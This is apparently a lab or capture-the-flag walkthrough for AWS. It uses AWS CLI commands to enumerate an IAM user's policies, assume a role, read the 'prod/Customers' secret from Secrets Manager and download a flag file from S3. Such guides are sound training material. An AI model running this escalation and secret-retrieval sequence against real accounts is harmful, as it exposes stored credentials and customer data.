# AWS IAM Enumeration and Role Assumption Guide

This documentation provides a step-by-step guide for enumerating AWS IAM permissions, assuming a role, and accessing Secrets Manager secrets. This guide is intended for educational purposes and should be used responsibly.

---

## Table of Contents

1. [Prerequisites](#prerequisites)
2. [Configure AWS CLI](#configure-aws-cli)
3. [Enumerate IAM User Policies](#enumerate-iam-user-policies)
4. [Assume a Role](#assume-a-role)
5. [Access Secrets Manager](#access-secrets-manager)
6. [Access S3 Bucket](#access-s3-bucket)
7. [Troubleshooting](#troubleshooting)

---

## Prerequisites

- **AWS CLI** installed on your system.
- **Basic Linux command line knowledge**.
- AWS IAM credentials (Access Key ID and Secret Access Key).

---

## 1. Configure AWS CLI

Configure the AWS CLI with the provided credentials. **Do not share your credentials in public repositories.**

```bash
aws configure
```

When prompted, enter the following (use placeholder values):

- **AWS Access Key ID**: `AKIAxxxxxxxxxxxxxxxx`
- **AWS Secret Access Key**: `wJalrxxxxxxxxxxxxxxxxxxxxxxxxxx`
- **Default region name**: `us-west-1`
- **Default output format**: `json`

Verify your configuration:

```bash
aws sts get-caller-identity
```

---

## 2. Enumerate IAM User Policies

Check the IAM user’s permissions to identify policies and roles attached to the user.

### List Attached User Policies

```bash
aws iam list-attached-user-policies --user-name dev01
```

### List Inline Policies

```bash
aws iam list-user-policies --user-name dev01
```

### Get Inline Policy Details

```bash
aws iam get-user-policy --user-name dev01 --policy-name S3_Access
```

---

## 3. Assume a Role

If the user has permission to assume a role (e.g., `BackendDev`), follow these steps:

### Assume the Role

```bash
aws sts assume-role --role-arn arn:aws:iam::123456789012:role/BackendDev --role-session-name BackendDevSession
```

### Extract Temporary Credentials

The command returns a JSON response with temporary credentials:

```json
{
    "Credentials": {
        "AccessKeyId": "ASIAXXXXXXXXXXXX",
        "SecretAccessKey": "wJalrXXXXXXXXXXX",
        "SessionToken": "IQoJb3JpZ2...",
        "Expiration": "2024-06-01T12:34:56Z"
    }
}
```

### Export Temporary Credentials

```bash
export AWS_ACCESS_KEY_ID="your_temporary_AccessKeyId"
export AWS_SECRET_ACCESS_KEY="your_temporary_SecretAccessKey"
export AWS_SESSION_TOKEN="your_temporary_SessionToken"
```

### Verify Role Assumption

```bash
aws sts get-caller-identity
```

---

## 4. Access Secrets Manager

Once you’ve assumed the role, list and retrieve secrets from AWS Secrets Manager.

### List Secrets

```bash
aws secretsmanager list-secrets
```

### Retrieve a Secret

```bash
aws secretsmanager get-secret-value --secret-id prod/Customers
```

### Display the Secret

```bash
aws secretsmanager get-secret-value --secret-id prod/Customers --query SecretString --output text
```

---

## 5. Access S3 Bucket

The IAM user may have specific permissions to access a bucket (e.g., `hl-dev-artifacts`).

### List Contents of the Bucket

```bash
aws s3 ls s3://hl-dev-artifacts
```

### Download a File (e.g., `flag.txt`)

```bash
aws s3 cp s3://hl-dev-artifacts/flag.txt .
```

### View the File

```bash
cat flag.txt
```

---

## 6. Troubleshooting

### Access Denied Errors

- Ensure the IAM user has the required permissions.
- Check for any restrictive policies attached to the user or role.

### Invalid Credentials

- Verify that your AWS Access Key, Secret Access Key, and Session Token (if assuming a role) are correctly set.

### Role Assumption Fails

- Confirm that the role trust policy allows your IAM user to assume the role.

---

## Disclaimer

This guide is for educational purposes only. Ensure you handle AWS credentials securely and avoid sharing them publicly.

---

**Author:** [Your GitHub Username]  
**License:** MIT
